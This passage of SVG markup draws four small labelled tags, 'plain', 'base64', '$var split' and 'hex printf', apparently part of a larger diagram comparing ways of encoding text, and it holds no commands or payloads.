  <rect x="34" y="300" width="40" height="13" rx="6" fill="#141a00" stroke="#889900" stroke-width="1"/>
  <text x="54" y="310" text-anchor="middle" font-size="7.5" fill="#445500">plain</text>
  <rect x="80" y="300" width="46" height="13" rx="6" fill="#141a00" stroke="#889900" stroke-width="1"/>
  <text x="103" y="310" text-anchor="middle" font-size="7.5" fill="#ccdd00">base64</text>
  <rect x="132" y="300" width="56" height="13" rx="6" fill="#0a0a0a" stroke="#1a2a00" stroke-width="1"/>
  <text x="160" y="310" text-anchor="middle" font-size="7.5" fill="#444">$var split</text>
  <rect x="194" y="300" width="62" height="13" rx="6" fill="#0a0a0a" stroke="#1a2a00" stroke-width="1"/>
  <text x="225" y="310" text-anchor="middle" font-size="7.5" fill="#444">hex printf</text>

